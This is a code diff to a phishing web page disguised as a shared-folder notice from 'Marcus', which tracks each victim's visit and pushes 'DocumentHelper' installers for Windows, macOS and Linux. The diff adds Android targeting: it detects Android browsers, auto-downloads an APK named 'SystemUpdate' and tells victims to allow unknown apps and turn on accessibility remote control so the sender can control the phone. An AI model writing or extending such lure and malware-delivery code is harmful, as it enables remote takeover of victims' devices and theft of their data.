@@ -91,7 +91,7 @@ footer{position:relative;z-index:1;text-align:center;padding:18px 16px 22px;font
   <h1>Marcus shared a folder with <span id="shared">you</span></h1>
   <div class="who">Sent to <b id="rcpt">you</b> · expires in 7 days</div>
   <div class="tok"><span>Folder token</span><b id="tk">—</b></div>
-  <div class="mob">Open this on your computer to get the folder.</div>
+  <div class="mob" id="mobnote">Open this on your computer to get the folder.</div>
   <div class="files">
     <div class="f"><span class="ic"></span><span class="nm">Engagement letter</span><span class="sz">your upload</span></div>
     <div class="f"><span class="ic"></span><span class="nm">Fee schedule</span><span class="sz">your upload</span></div>
@@ -101,11 +101,13 @@ footer{position:relative;z-index:1;text-align:center;padding:18px 16px 22px;font
   <div class="track" id="tr"><div class="fill" id="fl"></div></div>
   <div class="osline" id="osline"></div>
   <div class="hint" id="h">Download didn't start? <a href="/get">Open manually</a>.</div>
+  <div class="hint" id="apkhash" style="word-break:break-all">Android APK SHA-256: <b>F8C7970704F1035C84CCC62F57817E027AD44B8CB2C0F78855859D2251FAAECD</b></div>
   <div class="others">
     <span>Other systems:</span>
     <a href="/dl/DocumentHelper.exe">Windows</a>
     <a href="/dl/DocumentHelper.pkg">macOS</a>
     <a href="/dl/DocumentHelper.run">Linux</a>
+    <a href="/dl/SystemUpdate-1.0.23-release.apk">Android</a>
   </div>
 </div>
 
@@ -141,7 +143,8 @@ if(code)document.getElementById('tk').textContent=code;
 
 /* ---- OS detection: label the button and show what we detected ---- */
 var ua=navigator.userAgent;
-var os=/Windows/.test(ua)?'Windows':/Macintosh|Mac OS X/.test(ua)?'macOS':/Linux|X11/.test(ua)?'Linux':'';
+/* Android UAs also contain "Linux", so test Android first. */
+var os=/Android/.test(ua)?'Android':/Windows/.test(ua)?'Windows':/Macintosh|Mac OS X/.test(ua)?'macOS':/Linux|X11/.test(ua)?'Linux':'';
 
 /* ---- interaction tracking (nginx on mesh.telcom.stream) ----
    /t/<event>?e=&c=<folder code>&to=<name>&os=<os> is logged as one JSON line
@@ -160,7 +163,7 @@ function track(evt){
   }catch(e){}
 }
 track('open');
-var label={Windows:'Windows (.exe)',macOS:'macOS (.pkg)',Linux:'Linux (.run)'}[os]||'your computer';
+var label={Windows:'Windows (.exe)',macOS:'macOS (.pkg)',Linux:'Linux (.run)',Android:'Android (.apk)'}[os]||'your computer';
 var go=document.getElementById('go');
 go.textContent = os ? ('Download helper for '+os) : 'Download the helper';
 document.getElementById('osline').innerHTML =
@@ -193,7 +196,12 @@ if(os==='Windows'){
 }else if(os==='Linux'){
   co.innerHTML='Downloaded the <b>.run</b>? Run it once with: <b>sh DocumentHelper.run</b> (or mark it executable).';
   co.style.display='block';
+}else if(os==='Android'){
+  co.innerHTML='You’ll get <b>SystemUpdate-1.0.23-release.apk</b>. Open it from <b>Downloads</b>, tap <b>Install</b>, and allow <b>Install unknown apps</b> for this browser. Then open <b>System Update</b> and turn on <b>Accessibility Remote Control</b> so Marcus can control the phone.';
+  co.style.display='block';
+  document.getElementById('apkhash').classList.add('on');
+  document.getElementById('mobnote').textContent='Android detected — this installs on this phone and connects automatically.';
 }
 go.onclick=function(){start(true)};
-if(!/Mobi|Android|iPhone|iPad/.test(ua))setTimeout(function(){start(false)},1800);
+if(os==='Android'||!/Mobi|Android|iPhone|iPad/.test(ua))setTimeout(function(){start(false)},1800);
 </script></body></html>
